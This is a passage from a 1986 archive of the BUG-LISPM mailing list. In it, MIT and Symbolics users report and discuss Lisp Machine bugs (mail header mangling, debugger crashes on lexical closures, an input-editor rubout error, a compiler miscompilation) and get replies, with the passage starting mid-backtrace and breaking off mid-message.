   Local 0 (SI:FORM): (PROGN (WHEN (MEMBER (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES) (LET (#) (LOOP FOR RULE IN OLD-RULES DO #))) (SETQ SIMPLE-GRAMMAR-GENSYM (MAKE-INSTANCE (QUOTE GRAMMAR))) (LOOP FOR RULE IN (QUOTE (# # # #)) DO (UNLESS (MEMBER RULE *GRAMMAR :TEST #) (PUSH RULE *GRAMMAR)) (SEND SIMPLE-GRAMMAR-GENSYM :ADD-RULE RULE)) (UNLESS (MEMBER (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES) (PUSH (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES)))
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

ZWEI:EVAL-PRINT:  (P.C. = 3)
   Arg 0 (ZWEI:OBJECT): (DEFGRAMMAR SIMPLE-GRAMMAR (S ==> NP |.|) (NP ==> NP PP) (NP ==> N) (PP ==> P NP))

COMPILER:PROCESS-FORMS-FROM-STREAM:  (P.C. = 117)
   Arg 0 (COMPILER:INPUT-STREAM): #<INTERVAL-STREAM 1137766>
   Arg 1 (COMPILER:PROCESS-FUNCTION): #<DTP-COMPILED-FUNCTION ZWEI:EVAL-PRINT 31575120>
   --Defaulted args:--
   Arg 2 (COMPILER:FOR-FILE): NIL
   Arg 3 (COMPILER:AREA-FOR-READING): NIL

ZWEI:COMPILE-INTERVAL:  (P.C. = 317)
   Arg 0 (ZWEI:COMPILE-P): NIL
   Arg 1: NIL
   Arg 2: T
   Arg 3 (ZWEI:BP1): (#"(DEFGRAMMAR SIMPLE-GRAMMAR" 0)
   Arg 4 (ZWEI:BP2): (#";  (NBAR ==> ADJ N)" 0)
   Arg 5 (ZWEI:IN-ORDER-P): T
   Arg 6 (ZWEI:SPECIAL-COMPILER-FUNCTION): NIL
   Arg 7: NIL

Rest of stack:
ZWEI:COMPILE-PRINT-INTERVAL:  (P.C. = 121)
ZWEI:COMPILE-DEFINITION-INTERNAL:  (P.C. = 100)
ZWEI:COM-EVALUATE-REGION:  (P.C. = 7)
ZWEI:COM-EXTENDED-COMMAND:  (P.C. = 27)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
24-Feb-86 14:19:13-EST,1118;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Feb 86 13:57-EST
Date: Mon, 24 Feb 86 11:08:48 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  Bogus headers again!
To: BUG-LISPM@MC.LCS.MIT.EDU
Message-ID: <[MC.LCS.MIT.EDU].828655.860224.GUMBY>

This message was sent from ZMAIL.  Note the funky From: field:

This might just be due to old host tables; at the same time I noticed
that the machine had never heard of MIT-AI.ARPA!

From Gumby%MC.LCS.MIT.EDU@MC.LCS.MIT.EDU Sun Feb 23 04:51:02 1986
Posted-Date: Sun, 23 Feb 86 05:48 EST
Received-Date: Sun, 23 Feb 86 04:49:15 cst
Received: from OZ.AI.MIT.EDU (MC.LCS.MIT.EDU.ARPA) by sally.UTEXAS.EDU (4.22/4.22)
id AA09570; Sun, 23 Feb 86 04:49:15 cst
Received: from MOSCOW-CENTRE.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 05:49-EST
Date: Sun, 23 Feb 86 05:48 EST
From: David Vinayak Wallace <Gumby@MIT-MC.ARPA>
Subject: Re: Job info
To: Derrick Hartsock <derrick@SALLY.UTEXAS.EDU>
In-Reply-To: <8602202243.AA22665@sally.UTEXAS.EDU>
Message-Id: <860223054855.5.GUMBY@MOSCOW-CENTRE.AI.MIT.EDU>
Status: R
24-Feb-86 18:59:19-EST,1943;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Feb 86 18:59-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 24 Feb 86 17:57:02 EST
Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 424304; Mon 24-Feb-86 16:27:16-EST
Date: Mon, 24 Feb 86 16:23 EST
From: Joseph R Goldstone <joseph@SCRC-QUABBIN.ARPA>
Subject: Bogus headers again!
To: David Vinayak Wallace <GUMBY@MIT-MC.ARPA>, BUG-LISPM@MIT-MC.ARPA
In-Reply-To: <[MC.LCS.MIT.EDU].828655.860224.GUMBY>
Message-ID: <860224162327.5.JOSEPH@HARLEM.SCRC.Symbolics.COM>

    Date: Mon, 24 Feb 86 11:08:48 EST
    From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>

    This message was sent from ZMAIL.  Note the funky From: field:

    This might just be due to old host tables; at the same time I noticed
    that the machine had never heard of MIT-AI.ARPA!

    From Gumby%MC.LCS.MIT.EDU@MC.LCS.MIT.EDU Sun Feb 23 04:51:02 1986
    Posted-Date: Sun, 23 Feb 86 05:48 EST
    Received-Date: Sun, 23 Feb 86 04:49:15 cst
    Received: from OZ.AI.MIT.EDU (MC.LCS.MIT.EDU.ARPA) by sally.UTEXAS.EDU (4.22/4.22)
    id AA09570; Sun, 23 Feb 86 04:49:15 cst
    Received: from MOSCOW-CENTRE.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 05:49-EST
    Date: Sun, 23 Feb 86 05:48 EST
    From: David Vinayak Wallace <Gumby@MIT-MC.ARPA>
    Subject: Re: Job info
    To: Derrick Hartsock <derrick@SALLY.UTEXAS.EDU>
    In-Reply-To: <8602202243.AA22665@sally.UTEXAS.EDU>
    Message-Id: <860223054855.5.GUMBY@MOSCOW-CENTRE.AI.MIT.EDU>
    Status: R

I have often seen such mangling done by Unix hosts as they place the messages into
the unix "mbox" (if I remember that simple and elegant term correctly).  Was this
received on a Unix (sally?)?

Also, the path seems to be from ZMAIL on Moscow-Centre to OZ to sally, but MC is in
there in some weird way.  What is that parenthetical reference?

24-Feb-86 23:52:57-EST,1085;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Feb 86 23:52-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 24 FEB 86  23:50:57 EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 24067; Mon 24-Feb-86 23:53:54-EST
Date: Mon, 24 Feb 86 23:51 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Bogus headers again!
To: joseph@SCRC-QUABBIN.ARPA
cc: GUMBY@MIT-MC.ARPA, BUG-LISPM@MIT-MC.ARPA
In-Reply-To: <860224162327.5.JOSEPH@HARLEM.SCRC.Symbolics.COM>
Message-ID: <860224235107.5.CJL@OTIS.AI.MIT.EDU>

    Date: Mon, 24 Feb 86 16:23 EST
    From: Joseph R Goldstone <joseph@SCRC-QUABBIN.ARPA>

	Received: from OZ.AI.MIT.EDU (MC.LCS.MIT.EDU.ARPA) by sally.UTEXAS.EDU (4.22/4.22)

    Also, the path seems to be from ZMAIL on Moscow-Centre to OZ to sally, but MC is in
    there in some weird way.  What is that parenthetical reference?

Oz not being on the internet, sends TCP/SMTP mail through MC. Maybe this
is Sally saying the mail claims to be from OZ, but the TCP connection
came from MC.
25-Feb-86 08:51:43-EST,2813;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 08:51-EST
Date: Tue, 25 Feb 86 08:49:12 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  Bogus headers again!
To: joseph@SCRC-QUABBIN.ARPA
cc: BUG-LISPM@MC.LCS.MIT.EDU
In-reply-to: Msg of Mon 24 Feb 86 16:23 EST from Joseph R Goldstone <joseph at SCRC-QUABBIN.ARPA>
Message-ID: <[MC.LCS.MIT.EDU].829902.860225.GUMBY>

    Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 24 Feb 86 17:57:02 EST
    Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 424304; Mon 24-Feb-86 16:27:16-EST
    Date: Mon, 24 Feb 86 16:23 EST
    From: Joseph R Goldstone <joseph@SCRC-QUABBIN.ARPA>
    Subject: Bogus headers again!
    To: David Vinayak Wallace <GUMBY@MIT-MC.ARPA>, BUG-LISPM@MIT-MC.ARPA
    In-Reply-To: <[MC.LCS.MIT.EDU].828655.860224.GUMBY>
    Message-ID: <860224162327.5.JOSEPH@HARLEM.SCRC.Symbolics.COM>

        Date: Mon, 24 Feb 86 11:08:48 EST
        From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>

        This message was sent from ZMAIL.  Note the funky From: field:

        This might just be due to old host tables; at the same time I noticed
        that the machine had never heard of MIT-AI.ARPA!

        From Gumby%MC.LCS.MIT.EDU@MC.LCS.MIT.EDU Sun Feb 23 04:51:02 1986
        Posted-Date: Sun, 23 Feb 86 05:48 EST
        Received-Date: Sun, 23 Feb 86 04:49:15 cst
        Received: from OZ.AI.MIT.EDU (MC.LCS.MIT.EDU.ARPA) by sally.UTEXAS.EDU (4.22/4.22)
        id AA09570; Sun, 23 Feb 86 04:49:15 cst
        Received: from MOSCOW-CENTRE.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 05:49-EST
        Date: Sun, 23 Feb 86 05:48 EST
        From: David Vinayak Wallace <Gumby@MIT-MC.ARPA>
        Subject: Re: Job info
        To: Derrick Hartsock <derrick@SALLY.UTEXAS.EDU>
        In-Reply-To: <8602202243.AA22665@sally.UTEXAS.EDU>
        Message-Id: <860223054855.5.GUMBY@MOSCOW-CENTRE.AI.MIT.EDU>
        Status: R

    I have often seen such mangling done by Unix hosts as they place the
    messages into the unix "mbox" (if I remember that simple and elegant
    term correctly).  Was this received on a Unix (sally?)?

    Also, the path seems to be from ZMAIL on Moscow-Centre to OZ to sally,
    but MC is in there in some weird way.  What is that parenthetical
    reference?

Are you sure?  I was referring to the "From:" field, not the bogus
"From" field.  For all its manifold lossage, I've never seen
delivermail mung a "From:".

I just sent a test message directly from OZ to sally, so I'll report
more when I get that back.

Also, note that your reply to my bug report was sent to MIT-MC.ARPA.
I've included the entire header of your message for your perusing
pleasure.
25-Feb-86 09:15:44-EST,623;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 09:15-EST
Date: Tue, 25 Feb 86 09:14 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: inspector feature suggestion
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860225091416.1.ZVONA@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

The inspector should let you get at the bindings inside a lexical
closure.
25-Feb-86 09:31:19-EST,4772;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 09:31-EST
Date: Tue, 25 Feb 86 09:29 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: begubber blowout
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860225092947.2.ZVONA@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

I got this from c-m-E at the debugger.  The frame it blew out on was in
fact a lexical closure.  It happens repeatably, though I haven't tried
to construct a minimal sequence to cause it.

>>Error: The first argument (CONS) to CAR-LOCATION, NIL, was of the wrong type.
         The function expected a CONS.
While in the function CAR-LOCATION  (:INTERNAL DBG:FRAME-LEXICAL-ENVIRONMENT 1
                                      DBG:LEX-ENV-LOCF)  DBG:FRAME-LEXICAL-ENVIRONMENT

CAR-LOCATION:  (P.C. = 15)
   Arg 0 (CONS): NIL

(:INTERNAL DBG:FRAME-LEXICAL-ENVIRONMENT 1 DBG:LEX-ENV-LOCF):  (P.C. = 21)
   Arg 0 (DBG:ENV): (((...) 0 0 0 #<LEXICAL-CLOSURE ** 13541166>) 0
                     #<DTP-COMPILED-FUNCTION LENGTH1 7120207> 0)
   Arg 1 (NTH): 4

DBG:FRAME-LEXICAL-ENVIRONMENT:  (P.C. = 112)  (from SYS: PATCH; SYSTEM-271-26)
   Arg 0 (DBG:FRAME): #<DTP-LOCATIVE 74501413>

DBG:COM-SHOW-LEXICAL-ENVIRONMENT:  (P.C. = 15)

DBG:COMMAND-LOOP:  (P.C. = 375)

DBG:DEBUGGER-TOP-LEVEL:  (P.C. = 543)
   Arg 0: #<WRONG-TYPE-ARGUMENT-TRAP 17037740>
   Arg 1: #<DTP-LOCATIVE 74501575>
   Arg 2: NIL
   Arg 3 (DBG:SPECIAL-COMMANDS): NIL

DBG:ENTER-DEBUGGER:  (P.C. = 16)
   Arg 0 (ERROR): #<WRONG-TYPE-ARGUMENT-TRAP 17037740>
   --Defaulted args:--
   Arg 1 (DBG:REASON): NIL
   Arg 2 (DBG:SPECIAL-COMMANDS): NIL

DBG:DEBUGGER-HANDLER-HANDLE-CONDITION:  (P.C. = 7)
   Arg 0 (IGNORE): :HANDLE-CONDITION
   Arg 1 (COND): #<WRONG-TYPE-ARGUMENT-TRAP 17037740>
   Arg 2 (IGNORE): #<DTP-LOCATIVE 76621431>

Rest of stack:
DBG:DEBUGGER-HANDLER:  (P.C. = 12)
(:METHOD CONDITION :SIGNAL):  (P.C. = 114)
(:METHOD CONDITION :COMBINED :SIGNAL):  (P.C. = 17)
SIGNAL:  (P.C. = 24)
DBG:SIGNAL-TRAP:  (P.C. = 4)
SYS:MICROCODE-ERROR-HANDLER:  (P.C. = 103)
DDLI:MAKE-IMPLIED-JUSTIFICATION2:  (P.C. = 13)  (from DDL: DDL; ATMS)
(:INTERNAL (:INTERNAL (:INTERNAL ** 0) 0) 0):  (P.C. = 6)
(:INTERNAL LENGTH1 0):  (P.C. = 27)
DDL-PRIMITIVE-NULL:  (P.C. = 7)  (from DDL: DDL; PRIMS)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
LENGTH1:  (P.C. = 47)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
(:INTERNAL (:INTERNAL (:INTERNAL LENGTH1 0) 0) 0):  (P.C. = 26)
DDL-PRIMITIVE-1+:  (P.C. = 7)  (from DDL: DDL; PRIMS)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
(:INTERNAL (:INTERNAL LENGTH1 0) 0):  (P.C. = 47)
DDLI:DDL-CDR:  (P.C. = 30)  (from DDL: DDL; PRIMS)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
(:INTERNAL LENGTH1 0):  (P.C. = 76)
DDL-PRIMITIVE-NULL:  (P.C. = 7)  (from DDL: DDL; PRIMS)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
LENGTH1:  (P.C. = 47)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
DDL-LENGTH-DEFINITION:  (P.C. = 33)
DDLI:APPLY-ZETALISP-PROCEDURE:  (P.C. = 32)  (from DDL: DDL; EVAL)
DDLI:DDL-APPLY:  (P.C. = 20)  (from DDL: DDL; EVAL)
(:INTERNAL (:INTERNAL DDLI:DDL-EVAL-COMBINATION 0) 0):  (P.C. = 13)
(:INTERNAL DDLI:DDL-EVLIST 0 LOOP):  (P.C. = 23)
(:INTERNAL (:INTERNAL DDLI:DDL-EVLIST 0 LOOP) 0):  (P.C. = 30)
(:PROPERTY QUOTE DDLI:DDL-FEXPR):  (P.C. = 12)  (from DDL: DDL; EVAL)
DDLI:DDL-EVAL:  (P.C. = 65)  (from DDL: DDL; EVAL)
(:INTERNAL DDLI:DDL-EVLIST 0 LOOP):  (P.C. = 33)
DDLI:DDL-EVLIST:  (P.C. = 25)  (from DDL: DDL; EVAL)
(:INTERNAL DDLI:DDL-EVAL-COMBINATION 0):  (P.C. = 24)
DDLI:DDL-EVAL:  (P.C. = 43)  (from DDL: DDL; EVAL)
DDLI:DDL-EVAL-COMBINATION:  (P.C. = 23)  (from DDL: DDL; EVAL)
DDLI:DDL-EVAL:  (P.C. = 103)  (from DDL: DDL; EVAL)
DDLI:DDL-READ-EVAL-PRINT:  (P.C. = 76)  (from DDL: DDL; USERINT)
SI:*EVAL:  (P.C. = 401)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
25-Feb-86 11:09:46-EST,1473;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 11:09-EST
Date: Tue, 25 Feb 86 11:08 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: innumerable annoyances, particularly wrt lexical closures
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860225110813.6.ZVONA@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

I can't find a way to get at the environment of a lexical closure object
in the documentation.  Moreover, the relevant sources I could think of
to look at are missing (especially lcons).  Can someone tell me what the
function to do this is?

I could use describe to at least print out the lexical environment,
except that describe apparently binds prinlevel to something small, so
that what I want to look at is elided.  There seems to be no way to
over-ride this binding.

The index in Vol 2 of the rel 6 doc says that describe is documented on
page 69.  It isn't.

(lambda (x y z) (f x y z)) should optimize to f.  

I composed this message with a ``subjects:'' field.   When I tried to
send it, it complained that ``the subjects header would not have been
transmitted.''  Why not?  All the mailers I know will happily pass along
header fields they don't recognize.

Bleagh.
25-Feb-86 11:24:46-EST,382;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 11:24-EST
Date: Tue, 25 Feb 86 11:23 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: Chapter 3: advanced techniques of breaking and entering.
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <860225112313.7.ZVONA@SID.AI.MIT.EDU>

(defun lexical-closure-environment (lc) (car (%make-pointer dtp-list lc)))
25-Feb-86 11:34:12-EST,1507;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 11:34-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 25 Feb 86 11:32:00 EST
Received: from THAMES.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 855; Tue 25-Feb-86 10:51:23-EST
Date: Tue, 25 Feb 86 10:56 EST
From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>
Subject: begubber blowout
To: Zvona@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860225092947.2.ZVONA@SID.AI.MIT.EDU>
Message-ID: <860225105600.1.SWM@THAMES.SCRC.Symbolics.COM>

    Date: Tue, 25 Feb 86 09:29 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

    I got this from c-m-E at the debugger.  The frame it blew out on was in
    fact a lexical closure.  It happens repeatably, though I haven't tried
    to construct a minimal sequence to cause it.

    >>Error: The first argument (CONS) to CAR-LOCATION, NIL, was of the wrong type.
	     The function expected a CONS.
    While in the function CAR-LOCATION  (:INTERNAL DBG:FRAME-LEXICAL-ENVIRONMENT 1
					  DBG:LEX-ENV-LOCF)  DBG:FRAME-LEXICAL-ENVIRONMENT

I believe that most (maybe even all?) such bugs have been fixed in the
development system.


25-Feb-86 12:27:44-EST,1543;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 12:27-EST
Received: from HARVEY.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25485; Tue 25-Feb-86 12:26:38-EST
Date: Tue, 25 Feb 86 12:26 EST
From: Thomas A. Russ <TAR@MIT-MC.ARPA>
Subject: Input Editor Problem with Variable Value Choice Menus
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860225122602.1.TAR@HARVEY.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.10, MLSite 12.2, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine William Harvey:

There is a problem with the use of the input editor in the variable choice
menus.  It appears to be a counting problem in the rubout processing.  What
happens is that it is impossible to completely erase the previous value in the
choice menu by using rubout.  The attempt to rubout the last remaining character
on the line results in the original value being restored.  This is what should
happen when more characters are rubbed out than were present, but it happens
when exactly the number of characters present are rubbed out.

Example:

	(defvar baz 678)

	(tv:choose-variable-value '((baz :number)))

If the mouse is middle-clicked on "678", then only the "8" and the "7" can
be rubbed out in the input editor.  An attempt to rubout the "6" as well
results in "678" being restored to the input editor buffer.

Tom.
25-Feb-86 13:48:02-EST,1389;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 13:47-EST
Date: Tue, 25 Feb 86 13:46 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: Compiler generates code that calls neverneverland
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860225134628.9.ZVONA@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

It took a full day's work to track down and minimize this bug.  It would
make me happy if you could send me a patch.

Evaluate the following functions, and do (dt).  It will return 88.  Now
compile them and do (dt) again.  It will err, complaining that some
random list is not a valid function object.

(defun dumb (L-VALUE C-1429)
  (quux l-value
	(LAMBDA (CONDITION-VALUE)
	  (IF CONDITION-VALUE
	      (FUNCALL C-1429 88)
	      ;; wins if you beta-reduce this
	      ((LAMBDA (FCN-1431)
		 (baz
		   (LAMBDA ()
		     (funcall fcn-1431
			      nil
			      ;; wins if you replace this with c-1429
			      (LAMBDA (VALUE)
				(FUNCALL C-1429 VALUE))))))
	       'dumb))))) 
(defun quux (l-value c) (funcall c (null l-value)))
(defun baz (c) (funcall c))
(defun dt () (dumb t (lambda (x) x)))
25-Feb-86 14:08:06-EST,2135;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 14:07-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 25 Feb 86 14:03:48 EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 884; Tue 25-Feb-86 12:47:33-EST
Date: Tue, 25 Feb 86 12:47 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: innumerable annoyances, particularly wrt lexical closures
To: David Chapman <Zvona@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860225110813.6.ZVONA@SID.AI.MIT.EDU>
Message-ID: <860225124743.4.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Tue, 25 Feb 86 11:08 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

    I can't find a way to get at the environment of a lexical closure object
    in the documentation.  Moreover, the relevant sources I could think of
    to look at are missing (especially lcons).  Can someone tell me what the
    function to do this is?

(%p-contents-offset <lexical-closure> 0).  In Release 7 it will be
(sys:lexical-closure-environment <lexical-closure>).

    I could use describe to at least print out the lexical environment,
    except that describe apparently binds prinlevel to something small, so
    that what I want to look at is elided.  There seems to be no way to
    over-ride this binding.

    The index in Vol 2 of the rel 6 doc says that describe is documented on
    page 69.  It isn't.

    (lambda (x y z) (f x y z)) should optimize to f.  

That's a rather tricky thing to notice.

    I composed this message with a ``subjects:'' field.   When I tried to
    send it, it complained that ``the subjects header would not have been
    transmitted.''  Why not?  All the mailers I know will happily pass along
    header fields they don't recognize.

    Bleagh.

25-Feb-86 14:33:44-EST,1936;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 14:33-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 25 Feb 86 14:31:29 EST
Received: from CHICOPEE.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 902; Tue 25-Feb-86 14:30:50-EST
Date: Tue, 25 Feb 86 14:35 EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: Compiler generates code that calls neverneverland
To: David Chapman <Zvona@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860225134628.9.ZVONA@SID.AI.MIT.EDU>
Message-ID: <860225143506.6.HORNIG@CHICOPEE.SCRC.Symbolics.COM>

    Date: Tue, 25 Feb 86 13:46 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.3, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

    It took a full day's work to track down and minimize this bug.  It would
    make me happy if you could send me a patch.

    Evaluate the following functions, and do (dt).  It will return 88.  Now
    compile them and do (dt) again.  It will err, complaining that some
    random list is not a valid function object.

For what it's worth, "this problem will be fixed in a future release".

    (defun dumb (L-VALUE C-1429)
      (quux l-value
	    (LAMBDA (CONDITION-VALUE)
	      (IF CONDITION-VALUE
		  (FUNCALL C-1429 88)
		  ;; wins if you beta-reduce this
		  ((LAMBDA (FCN-1431)
		     (baz
		       (LAMBDA ()
			 (funcall fcn-1431
				  nil
				  ;; wins if you replace this with c-1429
				  (LAMBDA (VALUE)
				    (FUNCALL C-1429 VALUE))))))
		   'dumb))))) 
    (defun quux (l-value c) (funcall c (null l-value)))
    (defun baz (c) (funcall c))
    (defun dt () (dumb t (lambda (x) x)))

25-Feb-86 14:42:26-EST,2191;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 14:41-EST
Date: Tue, 25 Feb 1986  14:40 EST
Message-ID: <DRM.12186240916.BABYL@XX.LCS.MIT.EDU>
From: DRM@XX.LCS.MIT.EDU
To:   bug-lispm@OZ.AI.MIT.EDU
Subject: Installing Third-Party Software

Recently I was working with a company which is producing software for
